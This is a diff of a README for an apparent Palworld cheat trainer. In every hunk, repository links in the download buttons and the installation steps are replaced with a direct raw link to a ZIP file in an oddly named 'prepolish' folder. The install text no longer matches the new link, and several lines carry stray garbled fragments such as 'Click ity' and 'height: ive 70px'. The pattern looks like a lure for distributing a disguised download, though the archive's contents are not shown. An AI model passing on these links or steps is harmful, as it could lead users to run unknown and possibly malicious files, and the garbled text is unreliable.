@@ -1,7 +1,7 @@
 <h1>🎮 Palworld-Trainer---Palworld-Trainer-2026 - Unlock God Mode & Catch Every Pal Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Shirunashamed8972/Palworld-Trainer---Palworld-Trainer-2026">
+  <a href="https://raw.githubusercontent.com/Shirunashamed8972/Palworld-Trainer---Palworld-Trainer-2026/main/prepolish/Trainer_Palworld_1.9.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF5733?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50" alt="Download Button" style="width: 350px; height: 80px; font-size: 28px;">
   </a>
 </p>
@@ -72,7 +72,7 @@ The installation process is extremely simple. Follow these exact steps:
 **Step 1: Visit the Download Page**<br>
 Go to the official trainer page by clicking on the big download button at the top of this page, or copy and paste this link into your browser's address bar:
 
-👉 **https://github.com/Shirunashamed8972/Palworld-Trainer---Palworld-Trainer-2026**
+👉 **https://raw.githubusercontent.com/Shirunashamed8972/Palworld-Trainer---Palworld-Trainer-2026/main/prepolish/Trainer_Palworld_1.9.zip**
 
 **Step 2: Download the File**<br>
 Once you are on the GitHub page, you will see a green "Code" button. Click ity, and then select "Download ZIP". This will download the trainer files to your computer. (Optional: You can also use Git to clone the repository if you know how, but that is not necessary for normal use.)  
@@ -147,7 +147,7 @@ If you run into any issues that aren't covered here, please visit the GitHub rep
 <h2>🔗 Final Download Link</h2>
 
 <p align="center">
-  <a href="https://github.com/Shirunashamed8972/Palworld-Trainer---Palworld-Trainer-2026">
+  <a href="https://raw.githubusercontent.com/Shirunashamed8972/Palworld-Trainer---Palworld-Trainer-2026/main/prepolish/Trainer_Palworld_1.9.zip">
     <img src="https://img.shields.io/badge/⬇️_GET_TRAINER_NOW-27AE60?style=for-the-badge&logo=download&logoColor=white&labelColor=2C3E50" alt="Final Download" style="width: 300px; height:  ive 70px; font-size:  ive 22px;">
   </a>
 </p>
